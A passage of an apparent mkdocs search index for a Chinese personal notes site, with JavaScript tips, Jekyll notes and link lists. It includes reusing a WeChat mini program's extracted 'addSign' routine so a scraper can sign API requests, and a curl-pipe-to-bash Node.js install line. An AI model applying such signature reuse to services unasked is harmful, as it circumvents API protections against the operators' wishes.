();","title":"\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u4e0b\u8f7d Blob"},{"location":"JavaScript/#_8","text":"\u5728\u5206\u8eab\u7a7a\u95f4\u4e2d\u5b89\u88c5\u5fae\u4fe1\uff0c\u4f7f\u7528HttpCanary\u6293\u5230wxapkg\u7684url \u7528 https://gist.githubusercontent.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad/raw/a4d5f24f4d0102ce864008a86fdcc6e7888205c0/unwxapkg.py \u8fd9\u4e2a\u5de5\u5177\u5bf9\u5c0f\u7a0b\u5e8f\u89e3\u5305 \u641c\u7d22 duo_session \u5173\u952e\u8bcd\uff0c\u627e\u5230\u5bf9\u5e94\u7684util.js\u7684addSign\uff0c\u7528chrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u683c\u5f0f\u5316\u4ee3\u7801 \u770b\u4e86\u770b\u6574\u6bb5\u4ee3\u7801 \u633a\u590d\u6742\u7684\uff0c\u61d2\u5f97\u7528python\u6539\u5199\uff0c\u5c31\u4fdd\u7559\u539f\u6837js\u4f7f\u7528nodejs\u8c03\u7528\u5427 burpsuite\u9a8c\u8bc1\u786e\u5b9e\u53ef\u884c \u5047\u8bbe\u4f60\u5df2\u7ecf\u6709\u4e86addSign\u65b9\u6cd5 \u90a3\u4e48\u5c31\u63d0\u4f9b\u4e2ahttp\u670d\u52a1\u7ed9python\u722c\u866b\u8c03\u7528\u5427\uff1a var http = require ( \"http\" ); function start ( port ) { function onRequest ( request , response ) { var postData = \"\" ; request . setEncoding ( \"utf8\" ); request . addListener ( \"data\" , function ( postDataChunk ) { postData += postDataChunk ; }); request . addListener ( \"end\" , function () { // console . log ( postData ); console . log ( \"[\" + new Date () . toLocaleString () + \"]\" , request . connection . remoteAddress ); var data = JSON . parse ( postData ); addSign ( data ) response . writeHead ( 200 , { \"Content-Type\" : \"text/html\" }); response . write ( JSON . stringify ( data )); response . end (); }); } http . createServer ( onRequest ) . listen ( port ); console . log ( \"Server has started.\" ); } start ( 8888 );","title":"\u722c\u53d6\u5fae\u4fe1\u5c0f\u7a0b\u5e8f \u6735\u6735\u6821\u53cb\u5708"},{"location":"JavaScript/#_9","text":"\u8003\u8651\u8fd9\u6837\u4e00\u4e2a\u573a\u666f\uff1a\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e00\u9879\u90fd\u53ef\u4ee5\u70b9\u51fb\u6765\u5c55\u5f00\u8be6\u60c5div\uff0c\u70b9\u51fb\u65f6\u540c\u65f6\u9690\u85cf\u5176\u4ed6\u7684\u8be6\u60c5\uff08\u540c\u4e00\u65f6\u523b\u53ea\u663e\u793a\u4e00\u4e2a\uff09 \u53d1\u73b0\u4e00\u4e2abug\uff1a\u7279\u5b9a\u60c5\u51b5\u4e0b\uff08\u4e0d\u660e\u539f\u56e0\uff09\uff0c\u7528\u6237\u70b9\u51fb\u540e\u9875\u9762\u4f4d\u7f6e\u53d1\u751f\u4e86\u53d8\u5316\uff1a\u524d\u9762\u7684\u4e00\u4e2a\u6bd4\u8f83\u957f\u7684div\u9690\u85cf\u540e\uff0c\u5f53\u524d\u7684\u4f4d\u7f6e\u8df3\u5230\u4e86\u5f88\u4e0b\u9762\u7684\u5730\u65b9\uff0c\u9700\u8981\u624b\u52a8\u7ffb\u56de\u53bb\uff0c\u7528\u6237\u4f53\u9a8c\u6781\u5dee \u603b\u800c\u8a00\u4e4b\uff0c\u8fdb\u884c\u4e00\u4e9b\u9875\u9762DOM\u64cd\u4f5c\u540e\uff0c\u6211\u4eec\u60f3\u4fdd\u6301\u7279\u5b9a\u5143\u7d20 \u76f8\u5bf9\u4e8e\u7a97\u53e3\u7684\u4f4d\u7f6e \u4e0d\u53d8 \u89e3\u51b3\u65b9\u6848\uff1a\u5728\u5904\u7406\u70b9\u51fbevent\u65f6\uff0c\u5148\u8bb0\u5f55event.target\u76f8\u5bf9\u4e8ewindow\u7684top\u4f4d\u7f6e\uff0c\u5728\u8be6\u60c5div\u9690\u85cf\u4ee5\u53ca\u663e\u793a\u540e\u518d\u6b21\u8bb0\u5f55top\u4f4d\u7f6e\uff0c\u8fd9\u4e24\u4e2a\u4f4d\u7f6e\u4e4b\u95f4\u7684\u5dee\u503c\u5c31\u662f\u9700\u8981\u6eda\u52a8\u9875\u9762\u7684\u591a\u5c11 \u5f53\u8fd9\u4e2a\u5dee\u503c\u5f88\u5c0f\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5141\u8bb8\u7684\u8bef\u5dee\uff0c\u5b9e\u9645\u6ca1\u6709\u53ef\u89c1\u7684\u53d8\u5316 \u65e0\u9700\u64cd\u4f5c HTML : onclick = \"handle_click(event)\" JS : function fix_position ( et, oldt ){ var newt = et . getBoundingClientRect (). top ; if ( Math . abs ( oldt - newt )< 2 ) return ; $ ( window ). scrollTop ( $ ( window ). scrollTop ()+ newt - oldt ); } function handle_click ( event ){ var et = event . target ; var oldt = et . getBoundingClientRect (). top ; //...code for hide and show divs... fix_position ( et , oldt ); //also include this line to callback function if using ajax }","title":"\u4fdd\u6301\u7279\u5b9a\u5143\u7d20\u76f8\u5bf9\u4e8e\u7a97\u53e3\u7684\u4f4d\u7f6e\u4e0d\u53d8"},{"location":"JavaScript/#tampermonkey","text":"\u611f\u8c22 @CoolSpring \u7684\u89e3\u51b3\u65b9\u6848\uff1a https://v2ex.com/t/701749 \u73b0\u4ee3\u5316\u7684\u524d\u7aef\u505a\u4e86\u8868\u5355\u68c0\u67e5\uff0c\u76f4\u63a5\u5bf9input\u8d4b\u503c\u4e0d\u80fd\u901a\u8fc7\u68c0\u67e5\uff0c\u9700\u8981\u8c03\u7528\u88ab\u91cd\u8f7d\u7684setter\u51fd\u6570\uff1a function mytype ( input , value ){ var nativeInputValueSetter = Object . getOwnPropertyDescriptor ( window . HTMLInputElement . prototype , \"value\" ). set ; nativeInputValueSetter . call ( input , value ); input . dispatchEvent ( new Event ( 'input' , { bubbles : true })); } \u7528\u6cd5\uff1a mytype(document.querySelectorAll(\"input\")[0], USERNAME); mytype(document.querySelectorAll(\"input\")[1], PASSWORD);","title":"Tampermonkey\u81ea\u52a8\u586b\u5145\u7528\u6237\u540d\u5bc6\u7801\u8868\u5355\uff0c\u5e76\u901a\u8fc7\u524d\u7aef\u7684\u8868\u5355\u68c0\u67e5"},{"location":"JavaScript/#browserifynpmjs","text":"\u6d4f\u89c8\u5668\u4e0d\u652f\u6301require\uff0c\u600e\u4e48\u5728\u6d4f\u89c8\u5668\u91cc\u4f7f\u7528\u4e00\u4e2anpm\u5305\u5462\uff1f browserify \u793a\u4f8b\uff1a\u6211\u60f3\u5728tampermonkey\u91cc\u4f7f\u7528 user-event \u8fd9\u4e2anpm\u5305\uff0c \u7528\u6765\u5b8c\u6574\u5730\u6a21\u62df\u7528\u6237\u7684\u4ea4\u4e92\uff0c\u8fd9\u4e2a\u5176\u5b9e\u662f\u4e0a\u4e00\u4e2a\u95ee\u9898\u7684\u7b28\u91cd\u7248\u672c\u7684\u89e3\u51b3\u65b9\u6848 # \u5148\u5b89\u88c5\u76ee\u6807\u5e93\u3001browserify\u548cterser cnpm install @ testing - library / user - event @ testing - library / dom -- save - dev cnpm i - g browserify terser # \u5199\u4e00\u4e2amain.js\u5bfc\u5165\u8fd9\u4e2a\u5e93\uff0c\u5bfc\u51fa\u5230window\u91cc var userEvent = require ( '@testing-library/user-event' ); window . userEvent = userEvent . default ; # \u6267\u884c\u6253\u5305 browserify main . js | terser -- compress -- mangle > bundle . js # \u5728tampermonkey\u91cc\u4f7f\u7528 // @ require \u4e0a\u4f20\u5230 cdn\u540e\u7684js\u5730\u5740 userEvent . type ( document . querySelectorAll ( \"input\" )[ 0 ], USERNAME );","title":"\u4f7f\u7528browserify\u5c06npm\u5305\u6253\u5305\u6210\u6d4f\u89c8\u5668\u80fd\u7528\u7684js\u6587\u4ef6"},{"location":"JavaScript/#ubuntunodejs","text":"curl - fsSL https : // deb . nodesource . com / setup_16 . x | bash - curl - sL https : // dl . yarnpkg . com / debian / pubkey . gpg | gpg --dearmor | tee /usr/share/keyrings/yarnkey.gpg >/dev/null echo \"deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main\" | tee / etc / apt / sources . list . d / yarn . list apt update && apt install - y nodejs yarn yarn config set registry https : // registry . npm . taobao . org - g yarn config set disturl https : // npm . taobao . org / dist - g yarn config set electron_mirror https : // npm . taobao . org / mirrors / electron / - g yarn config set sass_binary_site https : // npm . taobao . org / mirrors / node - sass / - g yarn config set phantomjs_cdnurl https : // npm . taobao . org / mirrors / phantomjs / - g yarn config set chromedriver_cdnurl https : // cdn . npm . taobao . org / dist / chromedriver - g yarn config set operadriver_cdnurl https : // cdn . npm . taobao . org / dist / operadriver - g yarn config set fse_binary_host_mirror https : // npm . taobao . org / mirrors / fsevents - g","title":"Ubuntu\u5b89\u88c5nodejs"},{"location":"Jekyll/","text":"Jekyll \u00b6 \u76ee\u524d\u672c\u7ad9\u4f7f\u7528 Github Pages \uff0c~~\u91c7\u7528 Jekyll \u8f6c\u6362md\u4e3ahtml~~\uff0c\u6240\u4ee5\u6709\u5fc5\u8981\u8bb0\u5f55\u4e00\u4e0b\u6298\u817eJekyll\u7684\u8fc7\u7a0b\u54af \u66f4\u65b0\uff1a\u76ee\u524d\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528Jekyll\uff0c\u6539\u7528mkdocs \u78b0\u5230\u8fc7\u7684\u5751 \u00b6 jekyll \u4e0d\u8ba4 gbk \u7f16\u7801\uff0c\u5728\u8f6c\u6362\u524d\u9700\u8981\u5148\u5c06 md \u6587\u4ef6\u7f16\u7801\u6539\u4e3aUTF-8 \u672c\u5730\u7f16\u8bd1\u901a\u8fc7\u4e86\uff0c\u4f46Github\u5c31\u662f\u4e0d\u8ba4\uff0c\u4e8e\u662f\u5e72\u8106\u628a\u7f16\u8bd1\u597d\u7684html\u4f5c\u4e3aGithub Pages \u8f6c\u6362\u7684\u65f6\u5019\u9047\u5230\u4e24\u4e2a\u5927\u62ec\u53f7\u4e4b\u95f4\u7684\u4e1c\u897f\u4f1a\u81ea\u52a8\u7528Liquid\u6e32\u67d3\uff0c\u5bfc\u81f4\u6709\u4e00\u6761Docker\u7684\u7b14\u8bb0\u5c31\u4e22\u4e86\u4e1c\u897f\u5e76\u629b\u51fa\u4e86Warning\uff0c\u4e4b\u524d\u672c\u7740\u4e0d\u6298\u817e\u7684\u539f\u5219(\u5c31\u662f\u61d2)\uff0c\u76f4\u63a5\u5199\u4e86\u4e2acompile.sh\u5728jekyll\u7f16\u8bd1\u8fc7\u540e\u7528py\u66ff\u6362\u4e86\u4e00\u4e0b(\u771f\u4e0d\u4f18\u96c523333)\uff1b\u73b0\u5728\u53d1\u73b0\u4e86\u89e3\u51b3\u65b9\u6848\uff0c\u53c2\u89c1 \u672c\u9875md\u6587\u4ef6 \u914d\u7f6e\u4ee3\u7801\u9ad8\u4eae\u5e76\u663e\u793a\u884c\u53f7 \u00b6 \u4ee3\u7801\uff1a {% highlight java linenos %} public class HelloWorld { public static void main(String args[]) { System.out.println(\"Hello World!\"); } } {% endhighlight %} \u6548\u679c\u5982\u4e0b\uff1a(\u7531\u4e8e\u73b0\u5728\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528Jekyll\uff0c\u6240\u4ee5\u770b\u4e0d\u51fa\u4e8623333\uff09 {% highlight java linenos %} public class HelloWorld { public static void main(String args[]) { System.out.println(\u201cHello World!\u201d); } } {% endhighlight %} \u89e3\u51b3Github Metadata Warning \u00b6 \u53c2\u89c1http://mycyberuniverse.com/web/fixing-jekyll-github-metadata-warning.html \u5728\u6267\u884cbuild\u6216serve\u65f6\uff0c\u4f1a\u7ed9\u51fa\u8fd9\u6837\u7684Warning: GitHub Metadata: No GitHub API authentication could be found. Some fields may be missing or have incorrect data. \u89e3\u51b3\u65b9\u6cd5\u8be6\u7ec6\u7248\u8bf7\u89c1\u4e0a\u8ff0\u94fe\u63a5\uff0c\u7b80\u8981\u7248\uff1a\u5728Github\u7684\u8bbe\u7f6e\u4e2d\u5f97\u5230\u4e00\u4e2a\u80fd\u8bbf\u95ee\u516c\u5f00repo\u7684token\uff0c\u7528\u4ee5\u4e0b\u547d\u4ee4\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u5176\u4e2dabc123\u6539\u4e3a\u81ea\u5df1\u7684token export JEKYLL_GITHUB_TOKEN = 'abc123' \u89e3\u51b3Markdown\u6709\u5e8f\u5217\u8868\u88ab\u6587\u5b57\u95f4\u9694\u7684\u95ee\u9898 \u00b6 \u53c2\u8003\uff1a http://stackoverflow.com/questions/18088955/markdown-continue-numbered-list \u5728\u51993. \u4e4b\u524d\u52a0\u5165\u76f8\u5e94\u7684\u7f16\u53f7\u63a7\u5236\uff1a {:start=\"3\"} \u5b89\u88c5Jekyll \u00b6 \u641c\u7d22jekyll\u53d1\u73b0\u5b98\u7f51 https://jekyllrb.com/ \u5b89\u88c5\u8fc7\u7a0b\u4e00\u70b9\u90fd\u4e0d\u7b80\u5355\uff0c \u6211\u7684\u7cfb\u7edf\u73af\u5883\uff1aubuntu16.04 on win10 \u5b89\u88c5\u547d\u4ee4\u53c2\u8003\u5b98\u7f51\u53ca \u56fd\u5185\u955c\u50cf Ruby China \uff0c\u8fd8\u8e29\u4e86 \u57511 , \u57512 apt install - y ruby ruby - dev zlib1g - dev nodejs # \u5176\u4e2d zlib\u662f\u5b89\u88c5\u4f9d\u8d56nokogiri \uff08\u8fd9\u4e2a\u4f9d\u8d56\u7f16\u8bd1\u7279\u522b\u6162\uff09\u6240\u5fc5\u987b\u7684\uff0c\u5176\u4e2d nodejs\u662f\u9700\u8981\u7684javascript\u8fd0\u884c\u73af\u5883 gem update --system # \u8fd9\u91cc\u8bf7\u7ffb\u5899\u4e00\u4e0b gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/ gem install jekyll bundler # \u914d\u7f6e github - pages\u6240\u9700\u7684Gemfile \uff0c\u4e5f\u4f7f\u7528\u56fd\u5185\u955c\u50cf\u6e90 echo \"\"\"source 'https://gems.ruby-china.org' gem 'github-pages', group: :jekyll_plugins\"\"\" > Gemfile bundle install # \u8010\u5fc3\u7b49\u5f85\u7f16\u8bd1","title":"Jekyll"},{"location":"Jekyll/#jekyll","text":"\u76ee\u524d\u672c\u7ad9\u4f7f\u7528 Github Pages \uff0c~~\u91c7\u7528 Jekyll \u8f6c\u6362md\u4e3ahtml~~\uff0c\u6240\u4ee5\u6709\u5fc5\u8981\u8bb0\u5f55\u4e00\u4e0b\u6298\u817eJekyll\u7684\u8fc7\u7a0b\u54af \u66f4\u65b0\uff1a\u76ee\u524d\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528Jekyll\uff0c\u6539\u7528mkdocs","title":"Jekyll"},{"location":"Jekyll/#_1","text":"jekyll \u4e0d\u8ba4 gbk \u7f16\u7801\uff0c\u5728\u8f6c\u6362\u524d\u9700\u8981\u5148\u5c06 md \u6587\u4ef6\u7f16\u7801\u6539\u4e3aUTF-8 \u672c\u5730\u7f16\u8bd1\u901a\u8fc7\u4e86\uff0c\u4f46Github\u5c31\u662f\u4e0d\u8ba4\uff0c\u4e8e\u662f\u5e72\u8106\u628a\u7f16\u8bd1\u597d\u7684html\u4f5c\u4e3aGithub Pages \u8f6c\u6362\u7684\u65f6\u5019\u9047\u5230\u4e24\u4e2a\u5927\u62ec\u53f7\u4e4b\u95f4\u7684\u4e1c\u897f\u4f1a\u81ea\u52a8\u7528Liquid\u6e32\u67d3\uff0c\u5bfc\u81f4\u6709\u4e00\u6761Docker\u7684\u7b14\u8bb0\u5c31\u4e22\u4e86\u4e1c\u897f\u5e76\u629b\u51fa\u4e86Warning\uff0c\u4e4b\u524d\u672c\u7740\u4e0d\u6298\u817e\u7684\u539f\u5219(\u5c31\u662f\u61d2)\uff0c\u76f4\u63a5\u5199\u4e86\u4e2acompile.sh\u5728jekyll\u7f16\u8bd1\u8fc7\u540e\u7528py\u66ff\u6362\u4e86\u4e00\u4e0b(\u771f\u4e0d\u4f18\u96c523333)\uff1b\u73b0\u5728\u53d1\u73b0\u4e86\u89e3\u51b3\u65b9\u6848\uff0c\u53c2\u89c1 \u672c\u9875md\u6587\u4ef6","title":"\u78b0\u5230\u8fc7\u7684\u5751"},{"location":"Jekyll/#_2","text":"\u4ee3\u7801\uff1a {% highlight java linenos %} public class HelloWorld { public static void main(String args[]) { System.out.println(\"Hello World!\"); } } {% endhighlight %} \u6548\u679c\u5982\u4e0b\uff1a(\u7531\u4e8e\u73b0\u5728\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528Jekyll\uff0c\u6240\u4ee5\u770b\u4e0d\u51fa\u4e8623333\uff09 {% highlight java linenos %} public class HelloWorld { public static void main(String args[]) { System.out.println(\u201cHello World!\u201d); } } {% endhighlight %}","title":"\u914d\u7f6e\u4ee3\u7801\u9ad8\u4eae\u5e76\u663e\u793a\u884c\u53f7"},{"location":"Jekyll/#github-metadata-warning","text":"\u53c2\u89c1http://mycyberuniverse.com/web/fixing-jekyll-github-metadata-warning.html \u5728\u6267\u884cbuild\u6216serve\u65f6\uff0c\u4f1a\u7ed9\u51fa\u8fd9\u6837\u7684Warning: GitHub Metadata: No GitHub API authentication could be found. Some fields may be missing or have incorrect data. \u89e3\u51b3\u65b9\u6cd5\u8be6\u7ec6\u7248\u8bf7\u89c1\u4e0a\u8ff0\u94fe\u63a5\uff0c\u7b80\u8981\u7248\uff1a\u5728Github\u7684\u8bbe\u7f6e\u4e2d\u5f97\u5230\u4e00\u4e2a\u80fd\u8bbf\u95ee\u516c\u5f00repo\u7684token\uff0c\u7528\u4ee5\u4e0b\u547d\u4ee4\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u5176\u4e2dabc123\u6539\u4e3a\u81ea\u5df1\u7684token export JEKYLL_GITHUB_TOKEN = 'abc123'","title":"\u89e3\u51b3Github Metadata Warning"},{"location":"Jekyll/#markdown","text":"\u53c2\u8003\uff1a http://stackoverflow.com/questions/18088955/markdown-continue-numbered-list \u5728\u51993. \u4e4b\u524d\u52a0\u5165\u76f8\u5e94\u7684\u7f16\u53f7\u63a7\u5236\uff1a {:start=\"3\"}","title":"\u89e3\u51b3Markdown\u6709\u5e8f\u5217\u8868\u88ab\u6587\u5b57\u95f4\u9694\u7684\u95ee\u9898"},{"location":"Jekyll/#jekyll_1","text":"\u641c\u7d22jekyll\u53d1\u73b0\u5b98\u7f51 https://jekyllrb.com/ \u5b89\u88c5\u8fc7\u7a0b\u4e00\u70b9\u90fd\u4e0d\u7b80\u5355\uff0c \u6211\u7684\u7cfb\u7edf\u73af\u5883\uff1aubuntu16.04 on win10 \u5b89\u88c5\u547d\u4ee4\u53c2\u8003\u5b98\u7f51\u53ca \u56fd\u5185\u955c\u50cf Ruby China \uff0c\u8fd8\u8e29\u4e86 \u57511 , \u57512 apt install - y ruby ruby - dev zlib1g - dev nodejs # \u5176\u4e2d zlib\u662f\u5b89\u88c5\u4f9d\u8d56nokogiri \uff08\u8fd9\u4e2a\u4f9d\u8d56\u7f16\u8bd1\u7279\u522b\u6162\uff09\u6240\u5fc5\u987b\u7684\uff0c\u5176\u4e2d nodejs\u662f\u9700\u8981\u7684javascript\u8fd0\u884c\u73af\u5883 gem update --system # \u8fd9\u91cc\u8bf7\u7ffb\u5899\u4e00\u4e0b gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/ gem install jekyll bundler # \u914d\u7f6e github - pages\u6240\u9700\u7684Gemfile \uff0c\u4e5f\u4f7f\u7528\u56fd\u5185\u955c\u50cf\u6e90 echo \"\"\"source 'https://gems.ruby-china.org' gem 'github-pages', group: :jekyll_plugins\"\"\" > Gemfile bundle install # \u8010\u5fc3\u7b49\u5f85\u7f16\u8bd1","title":"\u5b89\u88c5Jekyll"},{"location":"Links/","text":"Links Share \u00b6 \u5206\u4eab\u4e00\u4e9bhacker\u76f8\u5173\u7684\u94fe\u63a5, \u5305\u542b\u5f00\u53d1\u3001\u5b89\u5168\u3001CTF \u89c9\u5f97\u6ca1\u4e8b\u5e72\uff1f \u4e0d\u5982\u6765\u901b\u901b\u8fd9\u4e9b\u5730\u65b9\u5427\uff1a \u5f00\u53d1\u7c7b \u00b6 Free Programming Books \u2013 github.com/vhf/free-programming-books \u2013 \u7f16\u7a0b\u76f8\u5173\u7684\u4e66\u7c4d \u7801\u519c\u7ffb\u8eab\u5fae\u4fe1\u6587\u7ae0 \u2013 mp.weixin.qq.com/s/nCx7Jb5WRXGzkpsuth6LAw V2EX \u2013 www.v2ex.com \u63a8\u9177 \u2013 tuicool.com \u6398\u91d1 \u2013 juejin.im PAT \u2013 patest.cn \u2013 \u7c7b\u4f3c\u7684\u8fd8\u6709 ZOJ , Leetcode\u7b49 \u5b89\u5168\u6280\u80fd \u00b6 \u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 \u2013 blog.knownsec.com i\u6625\u79cb \u2013 ichunqiu.com \u5408\u5929 \u2013 hetianlab.com \u5b9e\u9a8c\u697c \u2013 shiyanlou.com \u4e4c\u4e91\u6f0f\u6d1e\u5e93\u955c\u50cf \u2013 loner.fm pwnhub \u2013 pwnhub.cn pwnable \u2013 pwnable.kr Jarvis OJ \u2013 jarvisoj.com dnsbllookup \u2013 dnsbllookup.com \u67e5\u8be2ip\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d \u5176\u4e2d\u6709\u4e24\u4e2a\u5df2\u7ecf\u57df\u540d\u8fc7\u671f\u603b\u662f\u8fd4\u56deListed \u5b89\u5168\u8d44\u8baf \u00b6 FreeBuf \u2013 www.freebuf.com \u5b89\u5168\u5ba2 \u2013 bobao.360.cn bugs.chromium.org \u4e2a\u4eba\u535a\u5ba2 \u00b6 \u6309\u5b57\u6bcd\u987a\u5e8f\u6392\u5e8f Aploium Blog \u2013 z.codes Aqua\u2019s Blog \u2013 aqua.hk.cn ByStudent \u2013 bystudent.com \u706b\u65e5\u5c0f\u7ad9 \u2013 www.firesun.me free to play - Kira \u2013 lovekira.cn Jarvis\u2019s Blog \u2013 jarviswang.me LeadroyaL\u2019s website \u2013 www.leadroyal.cn Melody\u6709\u5965\u5999 \u2013 melodia.pw notebook \u2013 py3.io qsboy.com \u2013 qsboy.com \u6a31\u6843\u56ed \u2013 sakura.moe Swing\u2019Blog \u2013 bestwing.me \u2013 \u52aa\u529b\u662f\u4e3a\u4e86 \u7ad9\u5728\u4e07\u4eba\u4e2d\u592e \u6210\u4e3a\u522b\u4eba\u7684\u5149 \u4fe1\u946b-King\u2019s Blog \u2013 ycjcl.cc 850\u2019s Blog \u2013 850.world ZJU \u00b6 \u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\u653b\u7565\u5171\u4eab\u8ba1\u5212 \u2013 github.com/QSCTech/zju-icicles NexusHD \u2013 nexushd.org \u2013 \u5185\u7f51pt\u7ad9\u70b9\uff0c\u9ad8\u6e05\u8d44\u6e90 CC98 \u2013 cc98.org \u2013 cc98\u662f\u652f\u6301https\u7684\u5662 \u6d59\u5927\u4e91\u76d8 \u2013 pan.zju.edu.cn \u6c42\u662f\u6f6eBox \u2013 box.zjuqsc.com \u6559\u52a1\u7f51\u5185\u7f51\u7f51\u5740 \u2013 10.202.78.12 \u6559\u52a1\u7f51\u7684\u53cd\u5411\u4ee3\u7406 \u2013 jw.zjuqsc.com \u5f00\u6e90\u955c\u50cf\u7ad9 \u2013 mirrors.zju.edu.cn \u7afa\u9662\u5b66\u751f\u4f1a.\u5b66\u4e60\u8d44\u6599 \u2013 ckcsu.com \u6821\u62db\u85aa\u6c34 \u2013 ioffershow.com \u670d\u52a1\u63d0\u4f9b\u5546 \u00b6 \u9999\u6e2fVPS \u2013 diyvm.com \u817e\u8baf\u4e91\u5b66\u751f\u4f18\u60e0 \u2013 qcloud.com \u77ed\u4fe1\u9a8c\u8bc1\u7801 \u963f\u91cc\u5927\u4e8e \u2013 alidayu.com \u79c1\u6709\u4ee3\u7801\u6258\u7ba1 \u2013 coding.net \u2013 \u8bbf\u95ee\u901f\u5ea6\u4f18\u4e8egithub \u975e\u6280\u672f\u6587\u7ae0 \u00b6 \u5982\u4f55\u51c6\u5907\u6280\u672f\u7b80\u5386 \u6280\u672f\u9762\u8bd5\u6307\u5357 \u201c\u4ed6\u5c71\u4e4b\u77f3\uff0c\u53ef\u4ee5\u653b\u7389\u201d\u2014\u2014\u4f60\u7684\u5927\u5b66\uff0c\u600e\u6837\u8fc7\uff1f \u201c\u5e26\u7740\u624b\u673a\u4e0a\u81ea\u4e60\uff0c\u516b\u5c0f\u65f6\u505a\u4e00\u9053\u9898\u201d \u7ed3\u8bed \u00b6 \u4ee3\u7801\u4e0d\u80fd\u5f53\u996d\u5403\uff0c\u4ee3\u7801\u4e0d\u80fd\u5f53\u6c34\u559d\uff0c\u4ee3\u7801\u4e5f\u4e0d\u80fd\u7ed9\u8c01\u751f\u5b69\u5b50\u3002","title":"\u66f4\u591a\u94fe\u63a5"},{"location":"Links/#links-share","text":"\u5206\u4eab\u4e00\u4e9bhacker\u76f8\u5173\u7684\u94fe\u63a5, \u5305\u542b\u5f00\u53d1\u3001\u5b89\u5168\u3001CTF \u89c9\u5f97\u6ca1\u4e8b\u5e72\uff1f \u4e0d\u5982\u6765\u901b\u901b\u8fd9\u4e9b\u5730\u65b9\u5427\uff1a","title":"Links Share"},{"location":"Links/#_1","text":"Free Programming Books \u2013 github.com/vhf/free-programming-books \u2013 \u7f16\u7a0b\u76f8\u5173\u7684\u4e66\u7c4d \u7801\u519c\u7ffb\u8eab\u5fae\u4fe1\u6587\u7ae0 \u2013 mp.weixin.qq.com/s/nCx7Jb5WRXGzkpsuth6LAw V2EX \u2013 www.v2ex.com \u63a8\u9177 \u2013 tuicool.com \u6398\u91d1 \u2013 juejin.im PAT \u2013 patest.cn \u2013 \u7c7b\u4f3c\u7684\u8fd8\u6709 ZOJ , Leetcode\u7b49","title":"\u5f00\u53d1\u7c7b"},{"location":"Links/#_2","text":"\u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 \u2013 blog.knownsec.com i\u6625\u79cb \u2013 ichunqiu.com \u5408\u5929 \u2013 hetianlab.com \u5b9e\u9a8c\u697c \u2013 shiyanlou.com \u4e4c\u4e91\u6f0f\u6d1e\u5e93\u955c\u50cf \u2013 loner.fm pwnhub \u2013 pwnhub.cn pwnable \u2013 pwnable.kr Jarvis OJ \u2013 jarvisoj.com dnsbllookup \u2013 dnsbllookup.com \u67e5\u8be2ip\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d \u5176\u4e2d\u6709\u4e24\u4e2a\u5df2\u7ecf\u57df\u540d\u8fc7\u671f\u603b\u662f\u8fd4\u56deListed","title":"\u5b89\u5168\u6280\u80fd"},{"location":"Links/#_3","text":"FreeBuf \u2013 www.freebuf.com \u5b89\u5168\u5ba2 \u2013 bobao.360.cn bugs.chromium.org","title":"\u5b89\u5168\u8d44\u8baf"},{"location":"Links/#_4","text":"\u6309\u5b57\u6bcd\u987a\u5e8f\u6392\u5e8f Aploium Blog \u2013 z.codes Aqua\u2019s Blog \u2013 aqua.hk.cn ByStudent \u2013 bystudent.com \u706b\u65e5\u5c0f\u7ad9 \u2013 www.firesun.me free to play - Kira \u2013 lovekira.cn Jarvis\u2019s Blog \u2013 jarviswang.me LeadroyaL\u2019s website \u2013 www.leadroyal.cn Melody\u6709\u5965\u5999 \u2013 melodia.pw notebook \u2013 py3.io qsboy.com \u2013 qsboy.com \u6a31\u6843\u56ed \u2013 sakura.moe Swing\u2019Blog \u2013 bestwing.me \u2013 \u52aa\u529b\u662f\u4e3a\u4e86 \u7ad9\u5728\u4e07\u4eba\u4e2d\u592e \u6210\u4e3a\u522b\u4eba\u7684\u5149 \u4fe1\u946b-King\u2019s Blog \u2013 ycjcl.cc 850\u2019s Blog \u2013 850.world","title":"\u4e2a\u4eba\u535a\u5ba2"},{"location":"Links/#zju","text":"\u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\u653b\u7565\u5171\u4eab\u8ba1\u5212 \u2013 github.com/QSCTech/zju-icicles NexusHD \u2013 nexushd.org \u2013 \u5185\u7f51pt\u7ad9\u70b9\uff0c\u9ad8\u6e05\u8d44\u6e90 CC98 \u2013 cc98.org \u2013 cc98\u662f\u652f\u6301https\u7684\u5662 \u6d59\u5927\u4e91\u76d8 \u2013 pan.zju.edu.cn \u6c42\u662f\u6f6eBox \u2013 box.zjuqsc.com \u6559\u52a1\u7f51\u5185\u7f51\u7f51\u5740 \u2013 10.202.78.12 \u6559\u52a1\u7f51\u7684\u53cd\u5411\u4ee3\u7406 \u2013 jw.zjuqsc.com \u5f00\u6e90\u955c\u50cf\u7ad9 \u2013 mirrors.zju.edu.cn \u7afa\u9662\u5b66\u751f\u4f1a.\u5b66\u4e60\u8d44\u6599 \u2013 ckcsu.com \u6821\u62db\u85aa\u6c34 \u2013 ioffershow.com","title":"ZJU"},{"location":"Links/#_5","text":"\u9999\u6e2fVPS \u2013 diyvm.com \u817e\u8baf\u4e91\u5b66\u751f\u4f18\u60e0 \u2013 qcloud.com \u77ed\u4fe1\u9a8c\u8bc1\u7801 \u963f\u91cc\u5927\u4e8e \u2013 alidayu.com \u79c1\u6709\u4ee3\u7801\u6258\u7ba1 \u2013 coding.net \u2013 \u8bbf\u95ee\u901f\u5ea6\u4f18\u4e8egithub","title":"\u670d\u52a1\u63d0\u4f9b\u5546"},{"location":"Links/#_6","text":"\u5982\u4f55\u51c6\u5907\u6280\u672f\u7b80\u5386 